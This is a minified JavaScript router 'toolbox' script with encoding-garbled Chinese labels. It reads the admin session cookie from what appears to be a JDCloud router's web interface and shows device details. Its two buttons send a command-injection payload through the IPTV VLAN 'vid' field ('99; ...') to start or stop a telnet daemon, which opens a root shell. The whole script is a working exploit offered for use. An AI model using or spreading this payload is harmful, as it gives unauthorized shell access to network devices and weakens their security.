(function(){const d=document,l=m=>d.getElementById('jdc-log').innerHTML=m,s=d.cookie.split('; ').find(r=>r.startsWith('sessionid='))?.split('=')[1]||'';const st=d.createElement('style');st.innerHTML=`#jdc-container{position:fixed;top:15px;left:15px;z-index:10000;background:#fff;border:1px solid #dcdfe6;border-radius:10px;box-shadow:0 4px 25px rgba(0,0,0,0.2);width:280px;font-family:sans-serif;overflow:hidden;color:#303133;text-align:left}.jdc-head{background:#f5f7fa;padding:12px;border-bottom:1px solid #ebeef5;font-weight:bold;display:flex;justify-content:space-between;align-items:center}.jdc-body{padding:15px}.info-item{display:flex;justify-content:space-between;font-size:13px;margin-bottom:8px;align-items:center}.info-label{color:#909399}.info-val{color:#303133;font-family:monospace;cursor:pointer;padding:2px 4px;border-radius:4px}.blur-text{filter:blur(5px);background:#eee;user-select:none}.jdc-divider{height:1px;background:#ebeef5;margin:12px 0}.jdc-btn{width:100%;padding:10px;margin-bottom:8px;border:none;border-radius:6px;cursor:pointer;font-weight:bold;color:#fff}#btn-on{background:#67c23a}#btn-off{background:#f56c6c}#jdc-log{font-size:12px;background:#2b2b2b;color:#00ff00;padding:10px;border-radius:4px;margin-top:10px;min-height:40px;font-family:monospace;word-break:break-all;border-left:3px solid #67c23a}.jdc-footer{text-align:right;padding:8px 15px;font-size:14px;color:#606266;background:#fcfcfc;font-style:italic;border-top:1px solid #f0f0f0;font-weight:bold}`;d.head.appendChild(st);const c=d.createElement('div');c.id='jdc-container';c.innerHTML=`<div class="jdc-head"><span>XOSè·¯ç”±å™¨å·¥å…·ç®±</span><span id="close-jdc" style="cursor:pointer">Ã—</span></div><div class="jdc-body"><div id="router-info"><div class="info-item"><span class="info-label">çŠ¶æ€:</span><span id="st-session" class="info-val">...</span></div><div class="info-item"><span class="info-label">å‹å·:</span><span id="st-type" class="info-val">-</span></div><div class="info-item"><span class="info-label">ç‰ˆæœ¬:</span><span id="st-ver" class="info-val">-</span></div><div class="info-item"><span class="info-label">MAC:</span><span id="st-mac" class="info-val blur-text">...</span></div><div class="info-item"><span class="info-label">SN:</span><span id="st-sn" class="info-val blur-text">...</span></div></div><div class="jdc-divider"></div><button id="btn-on" class="jdc-btn">å¼€å¯ Telnet</button><button id="btn-off" class="jdc-btn">å…³é—­/è¿˜åŸ</button><div id="jdc-log">ç­‰å¾…...</div></div><div class="jdc-footer">by:xos</div>`;d.body.appendChild(c);const t=e=>e.target.classList.toggle('blur-text');d.getElementById('st-mac').onclick=t;d.getElementById('st-sn').onclick=t;d.getElementById('close-jdc').onclick=()=>c.remove();async function a(cmd,tp){if(!s)return alert("è¯·ç™»å½•");l("å‘é€ä¸­...");try{await fetch('/jdcapi',{method:'POST',body:JSON.stringify({"jsonrpc":"2.0","id":1,"method":"call","params":[s,"jdcapi.static","set_iptv_info",{"enable":"1","vlan_enable":"1","priority":"0","port":"1","vid":`99; ${cmd}`}]})});l(tp==='on'?"ğŸš€ å¼€å¯æˆåŠŸï¼<br>telnet 192.168.68.1":"âœ… å·²æ‰§è¡Œ");}catch(e){l(tp==='on'?"ğŸš€ æŒ‡ä»¤å·²ä¸‹å‘ï¼<br>telnet 192.168.68.1":"âœ… æŒ‡ä»¤å·²æ‰§è¡Œ");}}d.getElementById('btn-on').onclick=()=>a("factory_hm info telnet 1; telnetd -l /bin/login;","on");d.getElementById('btn-off').onclick=()=>a("killall telnetd; factory_hm info telnet 0;","off");(async function(){if(!s){d.getElementById('st-session').innerHTML='<span style="color:red">æœªç™»å½•</span>';return l("âŒ è¯·å…ˆç™»å½•");}d.getElementById('st-session').innerHTML='<span style="color:green">å·²ç™»å½•</span>';try{const r=await fetch('/jdcapi',{method:'POST',body:JSON.stringify({"jsonrpc":"2.0","id":1,"method":"call","params":[s,"jdcapi.static","web_get_router_info",{}]})});const g=await r.json();const i=g.result[1];d.getElementById('st-type').innerText=i.type;d.getElementById('st-ver').innerText=i.version;d.getElementById('st-mac').innerText=i.macaddr;d.getElementById('st-sn').innerText=i.sn;l("âœ… åŠ è½½æˆåŠŸ");}catch(e){l("âš ï¸ è·å–å¤±è´¥");}})();})();
